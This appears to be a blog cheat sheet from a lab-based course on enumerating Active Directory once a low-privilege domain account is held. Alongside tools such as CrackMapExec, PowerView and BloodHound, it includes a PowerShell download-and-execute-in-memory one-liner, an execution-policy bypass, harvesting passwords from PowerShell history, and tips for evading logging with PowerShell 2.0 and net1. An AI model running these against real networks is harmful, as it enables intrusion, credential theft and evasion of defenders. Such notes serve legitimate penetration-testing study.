---
title: "AD CRED ENUM"
date: 2023-08-09
draft: false
tags: ["Active-Directory"]
description: "Active Directory credential enumeration"

---

![](https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg)

## Credential Enumeration

After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:
- Domain users
- Computer Attributes
- group membership
- Group Policy Objects
- Permissions
- ACLs
- Trusts

but not limited to the above, but the most **important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.**
            
So at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.
            
## CrackMapExec.

This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.
            
### Domain UserEnum
            
When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a **********badPwdCount********** attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.
            
`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users`
            
### Domain Group Enum
            
We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.
            
`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx`  `--groups` 
            
We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.
            
## Smbmap
            
A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. 
            
### recursive list Dirs in Shares
            
`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
            
## RpcClient
            
Used to enumerate, add, change and even remove objects from AD.
            
### Enumeration 
            
[Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier utilized to track and identify objects, for example:
            
- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.

- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.

- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of `S-1-5-21-3842939050-3880317879-2865463114-1111`.

- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
            
Some accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have **500** or **0x1f4** this value is unique to an object hence we can use it to enumerate further info from the domain.
            
## Impacket-Toolkit

impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. 
            
### Psexec.py
            
A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.
            
Once comms are established it provides a shell as a SYSTEM on the victim host.
            
### windapsearch
            
[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da`(enumerate domain admins group members ) option and the `-PU`( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.
            
### Domain-Admins
            
`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`
            
This enumerates Domain Admin Groups.
            
### Privileged Users
            
Checking for potential users, using **-PU** with elevated privileges that may have gone unnoticed.
            
**N/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.**
            
`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`
            
## BloodHound
            
Once you have the domain credentials, you can run [BloodHound.py](https://github.com/fox-it/BloodHound.py) a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.
            
- ### Windows
        
At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup
        
- Do any trusts exist with other domains both inside & outside the current forest?
- Files shares that our user has access to.

## ActiveDirectory Powershell Modules

These are groups of Powershell cmdlets for enumerating AD environments.
        
`Get-ADDomain` - Print out domain SID, domain functional level, and child domains.
        
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` This will filter ACC with the **serviceprincipalname** property populated and also get us a listing ACC that may be susceptible to kerberos attacks.
        
`Get-ADTrust -Filter *` - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.
        
`Get-ADGroup -Filter * | select name` - Group enumeration
        
`Get-ADGroup -Identity "Backup Operators"` - Detailed Group Info
        
`Get-ADGroupMember -Identity "Backup Operators"` - Getting Group Membership
        
## Powerview
        
It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.
        
It gives an insight into the security posture of the target domain. 
        
- ### commands
          
            
| Command | Description |
| --- | --- |
Export-PowerViewCSV | Append results to a CSV file |
ConvertTo-SID | Convert a User or group name to its SID value 
| Get-DomainSPNTicket | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |
**Domain/LDAP Functions**
| Get-Domain | Will return the AD object for the current (or specified) domain |
| Get-DomainController | Return a list of the Domain Controllers for the specified domain |
| Get-DomainUser | Will return all users or specific user objects in AD |
 Get-DomainComputer | Will return all computers or specific computer objects in AD |
| Get-DomainGroup | Will return all groups or specific group objects in AD |
| Get-DomainOU | Search for all or specific OU objects in AD |
 Find-InterestingDomainAcl | Finds object ACLs in the domain with modification rights set to non-built in objects |
| Get-DomainGroupMember | Will return the members of a specific domain group |
| Get-DomainFileServer | Returns a list of servers likely functioning as file servers |
| Get-DomainDFSShare | Returns a list of all distributed file systems for the current (or specified) domain |
| GPO Functions: |  |
| Get-DomainGPO | Will return all GPOs or specific GPO objects in AD |
| Get-DomainPolicy | Returns the default domain policy or the domain controller policy for the current domain |
| **Computer Enumeration Functions**: 
| Get-NetLocalGroup | Enumerates local groups on the local or a remote machine |
| Get-NetLocalGroupMember | Enumerates members of a specific local group |
Get-NetShare | Returns open shares on the local (or a remote) machine |
| Get-NetSession | Will return session information for the local (or a remote) machine |
| Test-AdminAccess | Tests if the current user has administrative access to the local (or a remote) machine |
**Threaded 'Meta'-Functions**
| Find-DomainUserLocation | Finds machines where specific users are logged in |
| Find-DomainShare | Finds reachable shares on domain machines |
| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain |
| Find-LocalAdminAccess | Find machines on the local domain where the current user has local administrator access |
| **Domain Trust Functions** |  |
| Get-DomainTrust | Returns domain trusts for the current domain or a specified domain |
| Get-ForestTrust | Returns all forest trusts for the current forest or a specified forest |
| Get-DomainForeignUser | Enumerates users who are in groups outside of the user's domain |
| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member |
| Get-DomainTrustMapping | Will enumerate all trusts for the current domain and any others seen. |
        
**Domain User Info**        

`Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol`
        
******Recursive Group Membership******
        
`Get-DomainGroupMember -Identity "Domain Admins" -Recurse` - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (******nested group membership******) to list out the members of those groups.
        
************************************Trust Enumeration.************************************
        
`Get-DomainTrustMapping` test for local admin access on either the current machine or the remote one.
        
**********************************Testing for Local Admin Access********************************** 
        
`Test-AdminAccess -ComputerName ACADEMY-EA-MS01`
        
********************************Users with SPN Set********************************
        
`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`
        
## Shares
        
Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization. 
        
### Snaffler
        
 A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
        
## Living off the Land
    
Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.
    
Most enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.
    
### Env Enumeration Host & Network Recon
    
| Command | Result |
| --- | --- |
| hostname | Prints the PC's Name |
| [System.Environment]::OSVersion.Version | Prints out the OS version and revision level |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host |
| ipconfig /all | Prints out network adapter state and configurations |
| set %USERDOMAIN% | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| set %logonserver% | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
    
## Powershell
    
It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.
    
| Cmd-Let | Description |
| --- | --- |
| Get-Module | Lists available modules loaded for use. |
| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |
| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| Get-ChildItem Env: | ft Key, Value | Return environment values such as key paths, users, computer information, etc. |
| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |
    
## OPSec Tactics
    
A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.
    
### Example
    
> Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while utilizing resources built into the hosts to our advantage.

### Checking Defenses.
    
These few commands will utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
    
Firewall check - `netsh advfirewall show allprofiles`
    
Defender check cmd - `sc query windefend`
    
Checking the status and configuration settings - `Get-MpComputerStatus`
    
## Am I Alone?
    
When landing on a host for the first time, it's important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.
    
If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
    
### Network Enumeration
            
| Networking Commands | Description |
| --- | --- |
| arp -a | Lists all known hosts stored in the arp table. |
| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |
| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| netsh advfirewall shows state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |
    
### Windows Management Instrumentation (WMI)

 This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.
    
**Quick WMI checks**
    
| Command | Description |
| --- | --- |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |
| wmic process list /format:list | A listing of all processes on host |
| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |
| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |
 wmic group list /format:list | Information about all local groups |
| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |
    
This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
    
### Net Commands
    
Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.
    
| Command | Description |
| --- | --- |
| net accounts | Information about password requirements |
| net accounts /domain | Password and lockout policy |
| net group /domain | Information about domain groups |
| net group "Domain Admins" /domain | List users with domain admin privileges |
| net group "domain computers" /domain | List of PCs connected to the domain |
| net group "Domain Controllers" /domain | List PC accounts of domains controllers |
| net group <domain_group_name> /domain | User that belongs to the group |
| net groups /domain | List of domain groups |
| net localgroup | All available groups |
| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| net localgroup Administrators | Information about a group (admins) |
| net localgroup administrators [username] /add | Add user to administrators |
| net share | Check current shares |
| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |
| net user /domain | List all users of the domain |
| net user %username% | Information about the current user |
| net use x: \computer\share | Mount the share locally |
| net view | Get a list of computers |
| net view /all /domain[:domainname] | Shares on the domains |
| net view \computer /ALL | List shares of a computer |
| net view /domain | List of PCs of the domain |
    
## Net Command Tip.
    
If you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing **********************net1********************** instead of the ********net******** to work out using the net command.
    
## Dsquery 
    
A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.
    
****Dsquery**** will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`

A long read but worthy to check up on those commands one might not remember ...